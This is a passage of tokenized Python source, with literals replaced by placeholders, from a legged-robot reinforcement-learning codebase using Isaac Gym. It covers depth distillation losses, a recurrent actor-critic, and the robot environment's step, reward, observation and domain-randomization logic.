( ) <EOL> return depth_encoder_loss . item ( ) <EOL> def update_depth_actor ( self , actions_student_batch , actions_teacher_batch , yaw_student_batch , yaw_teacher_batch ) : <EOL> if self . if_depth : <EOL> depth_actor_loss = ( actions_teacher_batch . detach ( ) - actions_student_batch ) . norm ( p = <NUM_LIT> , dim = <NUM_LIT> ) . mean ( ) <EOL> yaw_loss = ( yaw_teacher_batch . detach ( ) - yaw_student_batch ) . norm ( p = <NUM_LIT> , dim = <NUM_LIT> ) . mean ( ) <EOL> loss = depth_actor_loss + yaw_loss <EOL> self . depth_actor_optimizer . zero_grad ( ) <EOL> loss . backward ( ) <EOL> nn . utils . clip_grad_norm_ ( self . depth_actor . parameters ( ) , self . max_grad_norm ) <EOL> self . depth_actor_optimizer . step ( ) <EOL> return depth_actor_loss . item ( ) , yaw_loss . item ( ) <EOL> def update_depth_both ( self , depth_latent_batch , scandots_latent_batch , actions_student_batch , actions_teacher_batch ) : <EOL> if self . if_depth : <EOL> depth_encoder_loss = ( scandots_latent_batch . detach ( ) - depth_latent_batch ) . norm ( p = <NUM_LIT> , dim = <NUM_LIT> ) . mean ( ) <EOL> depth_actor_loss = ( actions_teacher_batch . detach ( ) - actions_student_batch ) . norm ( p = <NUM_LIT> , dim = <NUM_LIT> ) . mean ( ) <EOL> depth_loss = depth_encoder_loss + depth_actor_loss <EOL> self . depth_actor_optimizer . zero_grad ( ) <EOL> depth_loss . backward ( ) <EOL> nn . utils . clip_grad_norm_ ( [ * self . depth_actor . parameters ( ) , * self . depth_encoder . parameters ( ) ] , self . max_grad_norm ) <EOL> self . depth_actor_optimizer . step ( ) <EOL> return depth_encoder_loss . item ( ) , depth_actor_loss . item ( ) <EOL> def update_counter ( self ) : <EOL> self . counter += <NUM_LIT> <EOL> def compute_apt_reward ( self , source , target ) : <EOL> b1 , b2 = source . size ( <NUM_LIT> ) , target . size ( <NUM_LIT> ) <EOL> sim_matrix = torch . norm ( source [ : , None , : ] . view ( b1 , <NUM_LIT> , - <NUM_LIT> ) - target [ None , : , : ] . view ( <NUM_LIT> , b2 , - <NUM_LIT> ) , dim = - <NUM_LIT> , p = <NUM_LIT> ) <EOL> reward , _ = sim_matrix . topk ( self . knn_k , dim = <NUM_LIT> , largest = False , sorted = True ) <EOL> if not self . knn_avg : <EOL> reward = reward [ : , - <NUM_LIT> ] <EOL> reward = reward . reshape ( - <NUM_LIT> , <NUM_LIT> ) <EOL> if self . rms : <EOL> moving_mean , moving_std = self . disc_state_rms ( reward ) <EOL> reward = reward / moving_std <EOL> reward = torch . clamp ( reward - self . knn_clip , <NUM_LIT> ) <EOL> else : <EOL> reward = reward . reshape ( - <NUM_LIT> , <NUM_LIT> ) <EOL> if self . rms : <EOL> moving_mean , moving_std = self . disc_state_rms ( reward ) <EOL> reward = reward / moving_std <EOL> reward = torch . clamp ( reward - self . knn_clip , <NUM_LIT> ) <EOL> reward = reward . reshape ( ( b1 , self . knn_k ) ) <EOL> reward = reward . mean ( dim = <NUM_LIT> ) <EOL> reward = torch . log ( reward + <NUM_LIT> ) <EOL> return reward <EOL> </s>
<s> import numpy as np <EOL> import torch <EOL> import torch . nn as nn <EOL> from torch . distributions import Normal <EOL> from torch . nn . modules import rnn <EOL> from . actor_critic import ActorCritic , get_activation <EOL> from rsl_rl . utils import unpad_trajectories <EOL> class ActorCriticRecurrent ( ActorCritic ) : <EOL> is_recurrent = True <EOL> def __init__ ( self , num_actor_obs , <EOL> num_critic_obs , <EOL> num_actions , <EOL> actor_hidden_dims = [ <NUM_LIT> , <NUM_LIT> , <NUM_LIT> ] , <EOL> critic_hidden_dims = [ <NUM_LIT> , <NUM_LIT> , <NUM_LIT> ] , <EOL> activation = '<STR_LIT>' , <EOL> rnn_type = '<STR_LIT>' , <EOL> rnn_hidden_size = <NUM_LIT> , <EOL> rnn_num_layers = <NUM_LIT> , <EOL> init_noise_std = <NUM_LIT> , <EOL> ** kwargs ) : <EOL> if kwargs : <EOL> print ( "<STR_LIT>" + str ( kwargs . keys ( ) ) , ) <EOL> super ( ) . __init__ ( num_actor_obs = rnn_hidden_size , <EOL> num_critic_obs = rnn_hidden_size , <EOL> num_actions = num_actions , <EOL> actor_hidden_dims = actor_hidden_dims , <EOL> critic_hidden_dims = critic_hidden_dims , <EOL> activation = activation , <EOL> init_noise_std = init_noise_std , <EOL> ** kwargs ) <EOL> activation = get_activation ( activation ) <EOL> self . memory_a = Memory ( num_actor_obs , type = rnn_type , num_layers = rnn_num_layers , hidden_size = rnn_hidden_size ) <EOL> self . memory_c = Memory ( num_critic_obs , type = rnn_type , num_layers = rnn_num_layers , hidden_size = rnn_hidden_size ) <EOL> print ( f"<STR_LIT>" ) <EOL> print ( f"<STR_LIT>" ) <EOL> def reset ( self , dones = None ) : <EOL> self . memory_a . reset ( dones ) <EOL> self . memory_c . reset ( dones ) <EOL> def act ( self , observations , masks = None , hidden_states = None ) : <EOL> input_a = self . memory_a ( observations , masks , hidden_states ) <EOL> return super ( ) . act ( input_a . squeeze ( <NUM_LIT> ) ) <EOL> def act_inference ( self , observations , ** kwargs ) : <EOL> input_a = self . memory_a ( observations , ** kwargs ) <EOL> return super ( ) . act_inference ( input_a . squeeze ( <NUM_LIT> ) ) <EOL> def evaluate ( self , critic_observations , masks = None , hidden_states = None ) : <EOL> input_c = self . memory_c ( critic_observations , masks , hidden_states ) <EOL> return super ( ) . evaluate ( input_c . squeeze ( <NUM_LIT> ) ) <EOL> def get_hidden_states ( self ) : <EOL> return self . memory_a . hidden_states , self . memory_c . hidden_states <EOL> class Memory ( torch . nn . Module ) : <EOL> def __init__ ( self , input_size , type = '<STR_LIT>' , num_layers = <NUM_LIT> , hidden_size = <NUM_LIT> ) : <EOL> super ( ) . __init__ ( ) <EOL> rnn_cls = nn . GRU if type . lower ( ) == '<STR_LIT>' else nn . LSTM <EOL> self . rnn = rnn_cls ( input_size = input_size , hidden_size = hidden_size , num_layers = num_layers ) <EOL> self . hidden_states = None <EOL> def forward ( self , input , masks = None , hidden_states = None ) : <EOL> batch_mode = masks is not None <EOL> if batch_mode : <EOL> if hidden_states is None : <EOL> raise ValueError ( "<STR_LIT>" ) <EOL> out , _ = self . rnn ( input , hidden_states ) <EOL> out = unpad_trajectories ( out , masks ) <EOL> else : <EOL> out , self . hidden_states = self . rnn ( input . unsqueeze ( <NUM_LIT> ) , self . hidden_states ) <EOL> return out <EOL> def reset ( self , dones = None ) : <EOL> for hidden_state in self . hidden_states : <EOL> hidden_state [ ... , dones , : ] = <NUM_LIT> <EOL> </s>
<s> from . actor_critic import ActorCriticRMA <EOL> from . estimator import Estimator <EOL> from . estimator import Discriminator , DiscriminatorLSD , DiscriminatorContDIAYN <EOL> from . depth_backbone import * <EOL> </s>
<s> from legged_gym import LEGGED_GYM_ROOT_DIR , envs <EOL> from time import time <EOL> from warnings import WarningMessage <EOL> import numpy as np <EOL> import os <EOL> from isaacgym . torch_utils import * <EOL> from isaacgym import gymtorch , gymapi , gymutil <EOL> import torch , torchvision <EOL> from torch import Tensor <EOL> from typing import Tuple , Dict <EOL> from legged_gym import LEGGED_GYM_ROOT_DIR <EOL> from legged_gym . envs . base . base_task import BaseTask <EOL> from legged_gym . utils . terrain import Terrain <EOL> from legged_gym . utils . math import * <EOL> from legged_gym . utils . helpers import class_to_dict <EOL> from scipy . spatial . transform import Rotation as R <EOL> from . legged_robot_config import LeggedRobotCfg <EOL> from tqdm import tqdm <EOL> import cv2 <EOL> import matplotlib . pyplot as plt <EOL> def euler_from_quaternion ( quat_angle ) : <EOL> x = quat_angle [ : , <NUM_LIT> ] ; y = quat_angle [ : , <NUM_LIT> ] ; z = quat_angle [ : , <NUM_LIT> ] ; w = quat_angle [ : , <NUM_LIT> ] <EOL> t0 = + <NUM_LIT> * ( w * x + y * z ) <EOL> t1 = + <NUM_LIT> - <NUM_LIT> * ( x * x + y * y ) <EOL> roll_x = torch . atan2 ( t0 , t1 ) <EOL> t2 = + <NUM_LIT> * ( w * y - z * x ) <EOL> t2 = torch . clip ( t2 , - <NUM_LIT> , <NUM_LIT> ) <EOL> pitch_y = torch . asin ( t2 ) <EOL> t3 = + <NUM_LIT> * ( w * z + x * y ) <EOL> t4 = + <NUM_LIT> - <NUM_LIT> * ( y * y + z * z ) <EOL> yaw_z = torch . atan2 ( t3 , t4 ) <EOL> return roll_x , pitch_y , yaw_z <EOL> class LeggedRobot ( BaseTask ) : <EOL> def __init__ ( self , cfg : LeggedRobotCfg , sim_params , physics_engine , sim_device , headless ) : <EOL> self . cfg = cfg <EOL> self . sim_params = sim_params <EOL> self . height_samples = None <EOL> self . debug_viz = True <EOL> self . init_done = False <EOL> self . _parse_cfg ( self . cfg ) <EOL> super ( ) . __init__ ( self . cfg , sim_params , physics_engine , sim_device , headless ) <EOL> self . resize_transform = torchvision . transforms . Resize ( ( self . cfg . depth . resized [ <NUM_LIT> ] , self . cfg . depth . resized [ <NUM_LIT> ] ) , <EOL> interpolation = torchvision . transforms . InterpolationMode . BICUBIC ) <EOL> if not self . headless : <EOL> self . set_camera ( self . cfg . viewer . pos , self . cfg . viewer . lookat ) <EOL> self . _init_buffers ( ) <EOL> self . _prepare_reward_function ( ) <EOL> self . init_done = True <EOL> self . global_counter = <NUM_LIT> <EOL> self . total_env_steps_counter = <NUM_LIT> <EOL> self . reset_idx ( torch . arange ( self . num_envs , device = self . device ) ) <EOL> self . post_physics_step ( ) <EOL> def step ( self , actions ) : <EOL> actions = self . reindex ( actions ) <EOL> actions . to ( self . device ) <EOL> self . action_history_buf = torch . cat ( [ self . action_history_buf [ : , <NUM_LIT> : ] . clone ( ) , actions [ : , None , : ] . clone ( ) ] , dim = <NUM_LIT> ) <EOL> if self . cfg . domain_rand . action_delay : <EOL> if self . global_counter % self . cfg . domain_rand . delay_update_global_steps == <NUM_LIT> : <EOL> if len ( self . cfg . domain_rand . action_curr_step ) != <NUM_LIT> : <EOL> self . delay = torch . tensor ( self . cfg . domain_rand . action_curr_step . pop ( <NUM_LIT> ) , device = self . device , dtype = torch . float ) <EOL> if self . viewer : <EOL> self . delay = torch . tensor ( self . cfg . domain_rand . action_delay_view , device = self . device , dtype = torch . float ) <EOL> indices = - self . delay - <NUM_LIT> <EOL> actions = self . action_history_buf [ : , indices . long ( ) ] <EOL> self . global_counter += <NUM_LIT> <EOL> self . total_env_steps_counter += <NUM_LIT> <EOL> clip_actions = self . cfg . normalization . clip_actions / self . cfg . control . action_scale <EOL> self . actions = torch . clip ( actions , - clip_actions , clip_actions ) . to ( self . device ) <EOL> self . render ( ) <EOL> for _ in range ( self . cfg . control . decimation ) : <EOL> self . torques = self . _compute_torques ( self . actions ) . view ( self . torques . shape ) <EOL> self . gym . set_dof_actuation_force_tensor ( self . sim , gymtorch . unwrap_tensor ( self . torques ) ) <EOL> self . gym . simulate ( self . sim ) <EOL> self . gym . fetch_results ( self . sim , True ) <EOL> self . gym . refresh_dof_state_tensor ( self . sim ) <EOL> self . post_physics_step ( ) <EOL> clip_obs = self . cfg . normalization . clip_observations <EOL> self . obs_buf = torch . clip ( self . obs_buf , - clip_obs , clip_obs ) <EOL> if self . privileged_obs_buf is not None : <EOL> self . privileged_obs_buf = torch . clip ( self . privileged_obs_buf , - clip_obs , clip_obs ) <EOL> self . extras [ "<STR_LIT>" ] = self . delta_yaw < <NUM_LIT> <EOL> if self . cfg . depth . use_camera and self . global_counter % self . cfg . depth . update_interval == <NUM_LIT> : <EOL> self . extras [ "<STR_LIT>" ] = self . depth_buffer [ : , - <NUM_LIT> ] <EOL> else : <EOL> self . extras [ "<STR_LIT>" ] = None <EOL> return self . obs_buf , self . privileged_obs_buf , self . rew_buf , self . reset_buf , self . extras <EOL> def get_history_observations ( self ) : <EOL> return self . obs_history_buf <EOL> def normalize_depth_image ( self , depth_image ) : <EOL> depth_image = depth_image * - <NUM_LIT> <EOL> depth_image = ( depth_image - self . cfg . depth . near_clip ) / ( self . cfg . depth . far_clip - self . cfg . depth . near_clip ) - <NUM_LIT> <EOL> return depth_image <EOL> def process_depth_image ( self , depth_image , env_id ) : <EOL> depth_image = self . crop_depth_image ( depth_image ) <EOL> depth_image += self . cfg . depth . dis_noise * <NUM_LIT> * ( torch . rand ( <NUM_LIT> ) - <NUM_LIT> ) [ <NUM_LIT> ] <EOL> depth_image = torch . clip ( depth_image , - self . cfg . depth . far_clip , - self . cfg . depth . near_clip ) <EOL> depth_image = self . resize_transform ( depth_image [ None , : ] ) . squeeze ( ) <EOL> depth_image = self . normalize_depth_image ( depth_image ) <EOL> return depth_image <EOL> def crop_depth_image ( self , depth_image ) : <EOL> return depth_image [ : - <NUM_LIT> , <NUM_LIT> : - <NUM_LIT> ] <EOL> def update_depth_buffer ( self ) : <EOL> if not self . cfg . depth . use_camera : <EOL> return <EOL> if self . global_counter % self . cfg . depth . update_interval != <NUM_LIT> : <EOL> return <EOL> self . gym . step_graphics ( self . sim ) <EOL> self . gym . render_all_camera_sensors ( self . sim ) <EOL> self . gym . start_access_image_tensors ( self . sim ) <EOL> for i in range ( self . num_envs ) : <EOL> depth_image_ = self . gym . get_camera_image_gpu_tensor ( self . sim , <EOL> self . envs [ i ] , <EOL> self . cam_handles [ i ] , <EOL> gymapi . IMAGE_DEPTH ) <EOL> depth_image = gymtorch . wrap_tensor ( depth_image_ ) <EOL> depth_image = self . process_depth_image ( depth_image , i ) <EOL> init_flag = self . episode_length_buf <= <NUM_LIT> <EOL> if init_flag [ i ] : <EOL> self . depth_buffer [ i ] = torch . stack ( [ depth_image ] * self . cfg . depth . buffer_len , dim = <NUM_LIT> ) <EOL> else : <EOL> self . depth_buffer [ i ] = torch . cat ( [ self . depth_buffer [ i , <NUM_LIT> : ] , depth_image . to ( self . device ) . unsqueeze ( <NUM_LIT> ) ] , dim = <NUM_LIT> ) <EOL> self . gym . end_access_image_tensors ( self . sim ) <EOL> def _update_goals ( self ) : <EOL> next_flag = self . reach_goal_timer > self . cfg . env . reach_goal_delay / self . dt <EOL> self . cur_goal_idx [ next_flag ] += <NUM_LIT> <EOL> self . reach_goal_timer [ next_flag ] = <NUM_LIT> <EOL> self . reached_goal_ids = torch . norm ( self . root_states [ : , : <NUM_LIT> ] - self . cur_goals [ : , : <NUM_LIT> ] , dim = <NUM_LIT> ) < self . cfg . env . next_goal_threshold <EOL> self . reach_goal_timer [ self . reached_goal_ids ] += <NUM_LIT> <EOL> self . target_pos_rel = self . cur_goals [ : , : <NUM_LIT> ] - self . root_states [ : , : <NUM_LIT> ] <EOL> self . next_target_pos_rel = self . next_goals [ : , : <NUM_LIT> ] - self . root_states [ : , : <NUM_LIT> ] <EOL> norm = torch . norm ( self . target_pos_rel , dim = - <NUM_LIT> , keepdim = True ) <EOL> target_vec_norm = self . target_pos_rel / ( norm + <NUM_LIT> ) <EOL> self . target_yaw = torch . atan2 ( target_vec_norm [ : , <NUM_LIT> ] , target_vec_norm [ : , <NUM_LIT> ] ) <EOL> norm = torch . norm ( self . next_target_pos_rel , dim = - <NUM_LIT> , keepdim = True ) <EOL> target_vec_norm = self . next_target_pos_rel / ( norm + <NUM_LIT> ) <EOL> self . next_target_yaw = torch . atan2 ( target_vec_norm [ : , <NUM_LIT> ] , target_vec_norm [ : , <NUM_LIT> ] ) <EOL> def post_physics_step ( self ) : <EOL> self . gym . refresh_actor_root_state_tensor ( self . sim ) <EOL> self . gym . refresh_net_contact_force_tensor ( self . sim ) <EOL> self . gym . refresh_rigid_body_state_tensor ( self . sim ) <EOL> self . gym . refresh_force_sensor_tensor ( self . sim ) <EOL> self . episode_length_buf += <NUM_LIT> <EOL> self . common_step_counter += <NUM_LIT> <EOL> self . base_quat [ : ] = self . root_states [ : , <NUM_LIT> : <NUM_LIT> ] <EOL> self . base_lin_vel [ : ] = quat_rotate_inverse ( self . base_quat , self . root_states [ : , <NUM_LIT> : <NUM_LIT> ] ) <EOL> self . base_ang_vel [ : ] = quat_rotate_inverse ( self . base_quat , self . root_states [ : , <NUM_LIT> : <NUM_LIT> ] ) <EOL> self . projected_gravity [ : ] = quat_rotate_inverse ( self . base_quat , self . gravity_vec ) <EOL> self . base_lin_acc = ( self . root_states [ : , <NUM_LIT> : <NUM_LIT> ] - self . last_root_vel [ : , : <NUM_LIT> ] ) / self . dt <EOL> self . roll , self . pitch , self . yaw = euler_from_quaternion ( self . base_quat ) <EOL> contact = torch . norm ( self . contact_forces [ : , self . feet_indices ] , dim = - <NUM_LIT> ) > <NUM_LIT> <EOL> self . contact_filt = torch . logical_or ( contact , self . last_contacts ) <EOL> self . last_contacts = contact <EOL> self . _update_goals ( ) <EOL> self . _post_physics_step_callback ( ) <EOL> self . check_termination ( ) <EOL> self . compute_reward ( ) <EOL> env_ids = self . reset_buf . nonzero ( as_tuple = False ) . flatten ( ) <EOL> self . reset_idx ( env_ids ) <EOL> self . cur_goals = self . _gather_cur_goals ( ) <EOL> self . next_goals = self . _gather_cur_goals ( future = <NUM_LIT> ) <EOL> self . update_depth_buffer ( ) <EOL> self . compute_observations ( ) <EOL> self . last_actions [ : ] = self . actions [ : ] <EOL> self . last_dof_vel [ : ] = self . dof_vel [ : ] <EOL> self . last_torques [ : ] = self . torques [ : ] <EOL> self . last_root_vel [ : ] = self . root_states [ : , <NUM_LIT> : <NUM_LIT> ] <EOL> if self . viewer and self . enable_viewer_sync and self . debug_viz : <EOL> self . gym . clear_lines ( self . viewer ) <EOL> self . _draw_goals ( ) <EOL> self . _draw_feet ( ) <EOL> if self . cfg . depth . use_camera : <EOL> window_name = "<STR_LIT>" <EOL> cv2 . namedWindow ( window_name , cv2 . WINDOW_NORMAL ) <EOL> cv2 . imshow ( "<STR_LIT>" , self . depth_buffer [ self . lookat_id , - <NUM_LIT> ] . cpu ( ) . numpy ( ) + <NUM_LIT> ) <EOL> cv2 . waitKey ( <NUM_LIT> ) <EOL> def reindex_feet ( self , vec ) : <EOL> return vec [ : , [ <NUM_LIT> , <NUM_LIT> , <NUM_LIT> , <NUM_LIT> ] ] <EOL> def reindex ( self , vec ) : <EOL> return vec [ : , [ <NUM_LIT> , <NUM_LIT> , <NUM_LIT> , <NUM_LIT> , <NUM_LIT> , <NUM_LIT> , <NUM_LIT> , <NUM_LIT> , <NUM_LIT> , <NUM_LIT> , <NUM_LIT> , <NUM_LIT> ] ] <EOL> def check_termination ( self ) : <EOL> self . reset_buf = torch . zeros ( ( self . num_envs , ) , dtype = torch . bool , device = self . device ) <EOL> roll_cutoff = torch . abs ( self . roll ) > <NUM_LIT> <EOL> pitch_cutoff = torch . abs ( self . pitch ) > <NUM_LIT> <EOL> reach_goal_cutoff = self . cur_goal_idx >= self . cfg . terrain . num_goals <EOL> height_cutoff = self . root_states [ : , <NUM_LIT> ] < - <NUM_LIT> <EOL> self . time_out_buf = self . episode_length_buf > self . max_episode_length <EOL> self . time_out_buf |= reach_goal_cutoff <EOL> self . reset_buf |= self . time_out_buf <EOL> self . reset_buf |= roll_cutoff <EOL> self . reset_buf |= pitch_cutoff <EOL> self . reset_buf |= height_cutoff <EOL> def reset_idx ( self , env_ids ) : <EOL> if len ( env_ids ) == <NUM_LIT> : <EOL> return <EOL> if self . cfg . terrain . curriculum : <EOL> self . _update_terrain_curriculum ( env_ids ) <EOL> if self . cfg . commands . curriculum and ( self . common_step_counter % self . max_episode_length == <NUM_LIT> ) : <EOL> self . update_command_curriculum ( env_ids ) <EOL> self . _reset_dofs ( env_ids ) <EOL> self . _reset_root_states ( env_ids ) <EOL> self . _resample_commands ( env_ids ) <EOL> self . gym . simulate ( self . sim ) <EOL> self . gym . fetch_results ( self . sim , True ) <EOL> self . gym . refresh_rigid_body_state_tensor ( self . sim ) <EOL> self . last_actions [ env_ids ] = <NUM_LIT> <EOL> self . last_dof_vel [ env_ids ] = <NUM_LIT> <EOL> self . last_torques [ env_ids ] = <NUM_LIT> <EOL> self . last_root_vel [ : ] = <NUM_LIT> <EOL> self . feet_air_time [ env_ids ] = <NUM_LIT> <EOL> self . reset_buf [ env_ids ] = <NUM_LIT> <EOL> self . obs_history_buf [ env_ids , : , : ] = <NUM_LIT> <EOL> self . contact_buf [ env_ids , : , : ] = <NUM_LIT> <EOL> self . action_history_buf [ env_ids , : , : ] = <NUM_LIT> <EOL> self . cur_goal_idx [ env_ids ] = <NUM_LIT> <EOL> self . reach_goal_timer [ env_ids ] = <NUM_LIT> <EOL> self . extras [ "<STR_LIT>" ] = { } <EOL> for key in self . episode_sums . keys ( ) : <EOL> self . extras [ "<STR_LIT>" ] [ '<STR_LIT>' + key ] = torch . mean ( self . episode_sums [ key ] [ env_ids ] ) / self . max_episode_length_s <EOL> self . episode_sums [ key ] [ env_ids ] = <NUM_LIT> <EOL> self . episode_length_buf [ env_ids ] = <NUM_LIT> <EOL> if self . cfg . terrain . curriculum : <EOL> self . extras [ "<STR_LIT>" ] [ "<STR_LIT>" ] = torch . mean ( self . terrain_levels . float ( ) ) <EOL> if self . cfg . commands . curriculum : <EOL> self . extras [ "<STR_LIT>" ] [ "<STR_LIT>" ] = self . command_ranges [ "<STR_LIT>" ] [ <NUM_LIT> ] <EOL> if self . cfg . env . send_timeouts : <EOL> self . extras [ "<STR_LIT>" ] = self . time_out_buf <EOL> def compute_reward ( self ) : <EOL> self . rew_buf [ : ] = <NUM_LIT> <EOL> for i in range ( len ( self . reward_functions ) ) : <EOL> name = self . reward_names [ i ] <EOL> rew = self . reward_functions [ i ] ( ) * self . reward_scales [ name ] <EOL> self . rew_buf += rew <EOL> self . episode_sums [ name ] += rew <EOL> if self . cfg . rewards . only_positive_rewards : <EOL> self . rew_buf [ : ] = torch . clip ( self . rew_buf [ : ] , min = <NUM_LIT> ) <EOL> if "<STR_LIT>" in self . reward_scales : <EOL> rew = self . _reward_termination ( ) * self . reward_scales [ "<STR_LIT>" ] <EOL> self . rew_buf += rew <EOL> self . episode_sums [ "<STR_LIT>" ] += rew <EOL> def compute_observations ( self ) : <EOL> imu_obs = torch . stack ( ( self . roll , self . pitch ) , dim = <NUM_LIT> ) <EOL> if self . global_counter % <NUM_LIT> == <NUM_LIT> : <EOL> self . delta_yaw = self . target_yaw - self . yaw <EOL> self . delta_next_yaw = self . next_target_yaw - self . yaw <EOL> obs_buf = torch . cat ( ( <EOL> self . base_ang_vel * self . obs_scales . ang_vel , <EOL> imu_obs , <EOL> <NUM_LIT> * self . delta_yaw [ : , None ] , <EOL> self . delta_yaw [ : , None ] , <EOL> self . delta_next_yaw [ : , None ] , <EOL> <NUM_LIT> * self . commands [ : , <NUM_LIT> : <NUM_LIT> ] , <EOL> self . commands [ : , <NUM_LIT> : <NUM_LIT> ] , <EOL> ( self . env_class != <NUM_LIT> ) . float ( ) [ : , None ] , <EOL> ( self . env_class == <NUM_LIT> ) . float ( ) [ : , None ] , <EOL> self . reindex ( ( self . dof_pos - self . default_dof_pos_all ) * self . obs_scales . dof_pos ) , <EOL> self . reindex ( self . dof_vel * self . obs_scales . dof_vel ) , <EOL> self . reindex ( self . action_history_buf [ : , - <NUM_LIT> ] ) , <EOL> self . reindex_feet ( self . contact_filt . float ( ) - <NUM_LIT> ) , <EOL> ) , dim = - <NUM_LIT> ) <EOL> priv_explicit = torch . cat ( ( self . base_lin_vel * self . obs_scales . lin_vel , <EOL> <NUM_LIT> * self . base_lin_vel , <EOL> <NUM_LIT> * self . base_lin_vel ) , dim = - <NUM_LIT> ) <EOL> priv_latent = torch . cat ( ( <EOL> self . mass_params_tensor , <EOL> self . friction_coeffs_tensor , <EOL> self . motor_strength [ <NUM_LIT> ] - <NUM_LIT> , <EOL> self . motor_strength [ <NUM_LIT> ] - <NUM_LIT> <EOL> ) , dim = - <NUM_LIT> ) <EOL> if self . cfg . terrain . measure_heights : <EOL> heights = torch . clip ( self . root_states [ : , <NUM_LIT> ] . unsqueeze ( <NUM_LIT> ) - <NUM_LIT> - self . measured_heights , - <NUM_LIT> , <NUM_LIT> ) <EOL> self . obs_buf = torch . cat ( [ obs_buf , heights , priv_explicit , priv_latent , self . obs_history_buf . view ( self . num_envs , - <NUM_LIT> ) ] , dim = - <NUM_LIT> ) <EOL> else : <EOL> self . obs_buf = torch . cat ( [ obs_buf , priv_explicit , priv_latent , self . obs_history_buf . view ( self . num_envs , - <NUM_LIT> ) ] , dim = - <NUM_LIT> ) <EOL> obs_buf [ : , <NUM_LIT> : <NUM_LIT> ] = <NUM_LIT> <EOL> self . obs_history_buf = torch . where ( <EOL> ( self . episode_length_buf <= <NUM_LIT> ) [ : , None , None ] , <EOL> torch . stack ( [ obs_buf ] * self . cfg . env . history_len , dim = <NUM_LIT> ) , <EOL> torch . cat ( [ <EOL> self . obs_history_buf [ : , <NUM_LIT> : ] , <EOL> obs_buf . unsqueeze ( <NUM_LIT> ) <EOL> ] , dim = <NUM_LIT> ) <EOL> ) <EOL> self . contact_buf = torch . where ( <EOL> ( self . episode_length_buf <= <NUM_LIT> ) [ : , None , None ] , <EOL> torch . stack ( [ self . contact_filt . float ( ) ] * self . cfg . env . contact_buf_len , dim = <NUM_LIT> ) , <EOL> torch . cat ( [ <EOL> self . contact_buf [ : , <NUM_LIT> : ] , <EOL> self . contact_filt . float ( ) . unsqueeze ( <NUM_LIT> ) <EOL> ] , dim = <NUM_LIT> ) <EOL> ) <EOL> def get_noisy_measurement ( self , x , scale ) : <EOL> if self . cfg . noise . add_noise : <EOL> x = x + ( <NUM_LIT> * torch . rand_like ( x ) - <NUM_LIT> ) * scale * self . cfg . noise . noise_level <EOL> return x <EOL> def create_sim ( self ) : <EOL> self . up_axis_idx = <NUM_LIT> <EOL> if self . cfg . depth . use_camera : <EOL> self . graphics_device_id = self . sim_device_id <EOL> self . sim = self . gym . create_sim ( self . sim_device_id , self . graphics_device_id , self . physics_engine , self . sim_params ) <EOL> mesh_type = self . cfg . terrain . mesh_type <EOL> start = time ( ) <EOL> print ( "<STR_LIT>" * <NUM_LIT> ) <EOL> print ( "<STR_LIT>" ) <EOL> if mesh_type in [ '<STR_LIT>' , '<STR_LIT>' ] : <EOL> self . terrain = Terrain ( self . cfg . terrain , self . num_envs ) <EOL> if mesh_type == '<STR_LIT>' : <EOL> self . _create_ground_plane ( ) <EOL> elif mesh_type == '<STR_LIT>' : <EOL> self . _create_heightfield ( ) <EOL> elif mesh_type == '<STR_LIT>' : <EOL> self . _create_trimesh ( ) <EOL> elif mesh_type is not None : <EOL> raise ValueError ( "<STR_LIT>" ) <EOL> print ( "<STR_LIT>" . format ( time ( ) - start ) ) <EOL> print ( "<STR_LIT>" * <NUM_LIT> ) <EOL> self . _create_envs ( ) <EOL> def set_camera ( self , position , lookat ) : <EOL> cam_pos = gymapi . Vec3 ( position [ <NUM_LIT> ] , position [ <NUM_LIT> ] , position [ <NUM_LIT> ] ) <EOL> cam_target = gymapi . Vec3 ( lookat [ <NUM_LIT> ] , lookat [ <NUM_LIT> ] , lookat [ <NUM_LIT> ] ) <EOL> self . gym . viewer_camera_look_at ( self . viewer , None , cam_pos , cam_target ) <EOL> def _process_rigid_shape_props ( self , props , env_id ) : <EOL> if self . cfg . domain_rand . randomize_friction : <EOL> if env_id == <NUM_LIT> : <EOL> friction_range = self . cfg . domain_rand . friction_range <EOL> num_buckets = <NUM_LIT> <EOL> bucket_ids = torch . randint ( <NUM_LIT> , num_buckets , ( self . num_envs , <NUM_LIT> ) ) <EOL> friction_buckets = torch_rand_float ( friction_range [ <NUM_LIT> ] , friction_range [ <NUM_LIT> ] , ( num_buckets , <NUM_LIT> ) , device = '<STR_LIT>' ) <EOL> self . friction_coeffs = friction_buckets [ bucket_ids ] <EOL> for s in range ( len ( props ) ) : <EOL> props [ s ] . friction = self . friction_coeffs [ env_id ] <EOL> return props <EOL> def _process_dof_props ( self , props , env_id ) : <EOL> if env_id == <NUM_LIT> : <EOL> self . dof_pos_limits = torch . zeros ( self . num_dof , <NUM_LIT> , dtype = torch . float , device = self . device , requires_grad = False ) <EOL> self . dof_vel_limits = torch . zeros ( self . num_dof , dtype = torch . float , device = self . device , requires_grad = False ) <EOL> self . torque_limits = torch . zeros ( self . num_dof , dtype = torch . float , device = self . device , requires_grad = False ) <EOL> for i in range ( len ( props ) ) : <EOL> self . dof_pos_limits [ i , <NUM_LIT> ] = props [ "<STR_LIT>" ] [ i ] . item ( ) <EOL> self . dof_pos_limits [ i , <NUM_LIT> ] = props [ "<STR_LIT>" ] [ i ] . item ( ) <EOL> self . dof_vel_limits [ i ] = props [ "<STR_LIT>" ] [ i ] . item ( ) <EOL> self . torque_limits [ i ] = props [ "<STR_LIT>" ] [ i ] . item ( ) <EOL> m = ( self . dof_pos_limits [ i , <NUM_LIT> ] + self . dof_pos_limits [ i , <NUM_LIT> ] ) / <NUM_LIT> <EOL> r = self . dof_pos_limits [ i , <NUM_LIT> ] - self . dof_pos_limits [ i , <NUM_LIT> ] <EOL> self . dof_pos_limits [ i , <NUM_LIT> ] = m - <NUM_LIT> * r * self . cfg . rewards . soft_dof_pos_limit <EOL> self . dof_pos_limits [ i , <NUM_LIT> ] = m + <NUM_LIT> * r * self . cfg . rewards . soft_dof_pos_limit <EOL> return props <EOL> def _process_rigid_body_props ( self , props , env_id ) : <EOL> if self . cfg . domain_rand . randomize_base_mass : <EOL> rng_mass = self . cfg . domain_rand . added_mass_range <EOL> rand_mass = np . random . uniform ( rng_mass [ <NUM_LIT> ] , rng_mass [ <NUM_LIT> ] , size = ( <NUM_LIT> , ) ) <EOL> props [ <NUM_LIT> ] . mass += rand_mass <EOL> else : <EOL> rand_mass = np . zeros ( ( <NUM_LIT> , ) ) <EOL> if self . cfg . domain_rand . randomize_base_com : <EOL> rng_com = self . cfg . domain_rand . added_com_range <EOL> rand_com = np . random . uniform ( rng_com [ <NUM_LIT> ] , rng_com [ 